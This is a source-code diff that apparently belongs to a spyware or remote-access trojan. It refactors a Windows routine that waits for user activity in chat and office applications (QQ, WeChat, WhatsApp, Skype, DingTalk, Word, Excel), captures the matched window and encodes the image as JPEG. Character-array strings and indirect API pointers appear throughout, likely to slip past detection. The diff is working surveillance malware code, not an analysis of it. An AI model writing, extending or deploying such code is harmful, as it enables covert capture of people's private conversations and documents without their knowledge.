@@ -10,8 +10,8 @@
 #pragma comment(lib, "GdiPlus.lib")
 
 
-
 using namespace Gdiplus;
+
 using namespace std;
 
 class GdiPlusIniter
@@ -34,86 +34,73 @@ private:
 
 
 
+#define MAX_APPSCREENSHOT_LIMIT		16
 
+#define MAX_APPSCREENSHOT_COUNT		9 
 
+#define VIRTUAL_KEY_SIZE			256
 
-#define MAX_APPSCREENSHOT_LIMIT 16
-#define MAX_APPSCREENSHOT_COUNT	9 
-#define VIRTUAL_KEY_SIZE		256
-
-int __stdcall GetAppScreenshot(int iTimeDelay)
+int __stdcall GetAppScreenshot(int iWaitTime)
 {
-	unsigned int iWaitTime = iTimeDelay * 1000;
-
 	GdiPlusIniter GdiPlusIniterGlobal;
 
 	int iRet = 0;
-	int bFindWinByClass = FALSE;
 
 	//char szWordWindowName[]		= {'_','W','w','G',0};
 	//char szExcelWindowName[]		= {'E','X','C','E','L',0};
 	//char szAliWangwangWindowName[]= {'A','e','f','_','R','e','n','d','e','r','W','i','d','g','e','t','H','o','s','t','H','W','N','D',0};
 	//char szWhatsappWindowName[]		= {'I','n','t','e','r','m','e','d','i','a','t','e',' ','D','3','D',' ','W','i','n','d','o','w',0};
 	//char szNewSkypeWindowName[]		= {'A','p','p','l','i','c','a','t','i','o','n','F','r','a','m','e','W','i','n','d','o','w',0};
-
-	char szQQWindowname[] = { 'T','X','G','u','i','F','o','u','n','d','a','t','i','o','n',0 };
-	char szWechatWindowName[] = { 'W','e','C','h','a','t','M','a','i','n','W','n','d','F','o','r','P','C',0 };
-	char szAliWangwangWindowName[] = { 'S','t','a','n','d','a','r','d','F','r','a','m','e',0 };
-	char szYYWindowName[] = { 'Q','W','i','d','g','e','t',0 };
-	char szSkypeWindowName[] = { 't','S','k','M','a','i','n','F','o','r','m',0 };
-	char szWordWindowName[] = { 'O','p','u','s','A','p','p',0 };
-	char szExcelWindowName[] = { 'X','L','M','A','I','N',0 };
-	char szWhatsappWindowName[] = { 'C','h','r','o','m','e','_','W','i','d','g','e','t','W','i','n','_','1',0 };
-	char szDingTalkWindowName[] = { 'S','t','a','n','d','a','r','d','F','r','a','m','e','_','D','i','n','g','T','a','l','k',0 };
-
 	//char szWechatLogin[]		= "WeChatLoginWndForPC";
 	//char szWordCap[]		= "Microsoft Word 文档";
 	//char szRealSkype[]		= {'S','k','y','p','e',0};
 	//char szWangwangGBK[]	= {(char)0xb0,(char)0xa2,(char)0xc0,(char)0xef,(char)0xcd,(char)0xfa,(char)0xcd,(char)0xfa,0};
 	//char szWechatCap[]		= "微信";
 
-	char szQQ[] = { 'Q','Q',0 };
-	char szWechat[] = { 'W','E','C','H','A','T',0 };
-	char szWangwang[] = { 'A','L','I','W','A','N','G','W','A','N','G',0 };
-	char szYY[] = { 'Y','Y',0 };
-	char szWord[] = { 'W','O','R','D',0 };
-	char szExcel[] = { 'E','X','C','E','L',0 };
-	char szWhatsapp[] = { 'W','H','A','T','S','A','P','P',0 };
-	char szSkype[] = { 'S','K','Y','P','E',0 };
-	char szdingtalk[] = { 'd','i','n','g','t','A','l','k',0 };
+	char szAppWindowClassNameList[][64] = {
+	{ 'T','X','G','u','i','F','o','u','n','d','a','t','i','o','n',0 },
+	 { 'W','e','C','h','a','t','M','a','i','n','W','n','d','F','o','r','P','C',0 },
+	 { 'S','t','a','n','d','a','r','d','F','r','a','m','e',0 },
+	{ 'Q','W','i','d','g','e','t',0 },
+	{ 't','S','k','M','a','i','n','F','o','r','m',0 },
+	{ 'O','p','u','s','A','p','p',0 },
+	{ 'X','L','M','A','I','N',0 },
+	{ 'C','h','r','o','m','e','_','W','i','d','g','e','t','W','i','n','_','1',0 },
+	{ 'S','t','a','n','d','a','r','d','F','r','a','m','e','_','D','i','n','g','T','a','l','k',0 },
+	};
 
-	char szAppNameList[MAX_APPSCREENSHOT_LIMIT][64] = { 0 };
-	lplstrcpyA(szAppNameList[0], szQQ);
-	lplstrcpyA(szAppNameList[1], szWechat);
-	lplstrcpyA(szAppNameList[2], szSkype);
-	lplstrcpyA(szAppNameList[3], szWhatsapp);
-	lplstrcpyA(szAppNameList[4], szWord);
-	lplstrcpyA(szAppNameList[5], szExcel);
-	lplstrcpyA(szAppNameList[6], szWangwang);
-	lplstrcpyA(szAppNameList[7], szYY);
-	lplstrcpyA(szAppNameList[8], szdingtalk);
+	char szAppNameList[][64] = {
+	{ 'Q','Q',0 },
+	{ 'W','E','C','H','A','T',0 },
+	{ 'A','L','I','W','A','N','G','W','A','N','G',0 },
+	{ 'Y','Y',0 },
+	 { 'W','O','R','D',0 },
+	 { 'E','X','C','E','L',0 },
+	 { 'W','H','A','T','S','A','P','P',0 },
+	 { 'S','K','Y','P','E',0 },
+	 { 'd','i','n','g','t','A','l','k',0 },
+	};
 
-	char szAppWindowClassNameList[MAX_APPSCREENSHOT_LIMIT][64] = { 0 };
-	lplstrcpyA(szAppWindowClassNameList[0], szQQWindowname);
-	lplstrcpyA(szAppWindowClassNameList[1], szWechatWindowName);
-	lplstrcpyA(szAppWindowClassNameList[2], szSkypeWindowName);
-	lplstrcpyA(szAppWindowClassNameList[3], szWhatsappWindowName);
-	lplstrcpyA(szAppWindowClassNameList[4], szWordWindowName);
-	lplstrcpyA(szAppWindowClassNameList[5], szExcelWindowName);
-	lplstrcpyA(szAppWindowClassNameList[6], szAliWangwangWindowName);
-	lplstrcpyA(szAppWindowClassNameList[7], szYYWindowName);
-	lplstrcpyA(szAppWindowClassNameList[8], szDingTalkWindowName);
+	int iAppCounter = sizeof(szAppWindowClassNameList) / sizeof(szAppWindowClassNameList[0]);
 
-	int iAppCounter = MAX_APPSCREENSHOT_COUNT;
-	int iAppIndex = 0;
+	char szScreenDCName[] = { 'D','I','S','P','L','A','Y',0 };
+
+	char szusJpgFormat[] = { 'i',0,'m',0,'a',0,'g',0,'e',0,'/',0,'j',0,'p',0,'e',0,'g',0,0,0 };
+	//char szusJpgFormat[]	= {'i',0,'m',0,'a',0,'g',0,'e',0,'/',0,'b',0,'m',0,'p',0,0,0};
 
 	__try
 	{
-		unsigned int iWaitCnt = iWaitTime;
+
+		int bFindWinByClass = FALSE;
+
+		int iWaitCnt = iWaitTime;
+
 		int iFlagMouseKey = 0;
-		RECT stAppRect = { 0 };
+
 		POINT stLastPoint = { 0 };
+
 		BYTE szLastKeyboardState[VIRTUAL_KEY_SIZE] = { 0 };
+
 		while (TRUE)
 		{
 			lpSleep(SREENSNAPSHOT_WAIT_TIME_INTERVAL);
@@ -124,6 +111,10 @@ int __stdcall GetAppScreenshot(int iTimeDelay)
 				continue;
 			}
 
+			RECT stAppRect = { 0 };
+
+			int iAppIndex = 0;
+
 			//不用window名称查找
 			if (bFindWinByClass == TRUE)
 			{
@@ -132,19 +123,10 @@ int __stdcall GetAppScreenshot(int iTimeDelay)
 					HWND hAppWnd = lpFindWindowA(0, szAppNameList[iAppIndex]);
 					if (hAppWnd && hAppWnd == hTopWnd)
 					{
-						iRet = lpGetWindowRect(hAppWnd, &stAppRect);
-						if (iRet == 0)
-						{
-							continue;
-						}
-						else {
-							break;
-						}
+						iRet = lpGetWindowRect(hTopWnd, &stAppRect);
+						break;
 					}
-					else
-					{
-						continue;
-					}
+
 				}
 			}
 			else {
@@ -157,29 +139,18 @@ int __stdcall GetAppScreenshot(int iTimeDelay)
 
 				for (iAppIndex = 0; iAppIndex < iAppCounter; iAppIndex++)
 				{
-					if (lplstrcmpiA(szWindowClassName, szAppWindowClassNameList[iAppIndex]) != 0)
-					{
-						continue;
-					}
-					else
+					if (lplstrcmpiA(szWindowClassName, szAppWindowClassNameList[iAppIndex]) == 0)
 					{
 						iRet = lpGetWindowRect(hTopWnd, &stAppRect);
-						if (iRet == 0)
-						{
-							continue;
-						}
-						else {
-							break;
-						}
+						break;
 					}
-				}
-
-				if (iAppIndex >= iAppCounter)
-				{
-					continue;
 				}
 			}
 
+			if (iAppIndex >= iAppCounter || (stAppRect.right - stAppRect.left == 0 || stAppRect.bottom - stAppRect.top == 0))
+			{
+				continue;
+			}
 
 			POINT stCurPoint = { 0 };
 			iRet = lpGetCursorPos(&stCurPoint);
@@ -197,21 +168,27 @@ int __stdcall GetAppScreenshot(int iTimeDelay)
 				iFlagMouseKey++;
 			}
 
-			if (iFlagMouseKey == 0)
+			iWaitCnt++;
+			if (iWaitCnt >= iWaitTime)
 			{
-				continue;
-			}
-			else
-			{
-				iWaitCnt++;
-				if (iWaitCnt >= iWaitTime)
+				iWaitCnt = 0;
+				if (iFlagMouseKey)
 				{
-					iWaitCnt = 0;
-					iFlagMouseKey = 0;
+					if (iFlagMouseKey >= 3)
+					{
+						iFlagMouseKey = 0;
+					}
+					else {
+						iFlagMouseKey = 0;
+						continue;
+					}
 				}
 				else {
 					continue;
 				}
+			}
+			else {
+				continue;
 			}
 
 			//check if is in screen save state
@@ -222,8 +199,6 @@ int __stdcall GetAppScreenshot(int iTimeDelay)
 				//writeLog("screen is sleeping\r\n");
 				continue;
 			}
-
-			char szScreenDCName[] = { 'D','I','S','P','L','A','Y',0 };
 
 			int xscrn = stAppRect.right - stAppRect.left;			//lpGetDeviceCaps(hdc, HORZRES);
 			int yscrn = stAppRect.bottom - stAppRect.top;			//lpGetDeviceCaps(hdc, VERTRES);
@@ -237,7 +212,6 @@ int __stdcall GetAppScreenshot(int iTimeDelay)
 				continue;
 			}
 
-
 			IStream* istrBmp = NULL;
 			IStream* istrJpg = NULL;
 			iRet = _lpCreateStreamOnHGlobal(lpBuf, FALSE, &istrBmp);
@@ -245,12 +219,10 @@ int __stdcall GetAppScreenshot(int iTimeDelay)
 
 			EncoderParameters encoderParameters;
 			CLSID jpgClsid;
-			char szusJpgFormat[] = { 'i',0,'m',0,'a',0,'g',0,'e',0,'/',0,'j',0,'p',0,'e',0,'g',0,0,0 };
-			//char szusJpgFormat[]	= {'i',0,'m',0,'a',0,'g',0,'e',0,'/',0,'b',0,'m',0,'p',0,0,0};
 
 			if (GetEncoderClsid((const WCHAR*)szusJpgFormat, &jpgClsid) == -1)
 			{
-				writeLog("GetScreenSnapshot GetEncoderClsid error\r\n");
+				writeLog("AppScreenSnapShot GetEncoderClsid error\r\n");
 				continue;
 			}
 			encoderParameters.Count = 1;
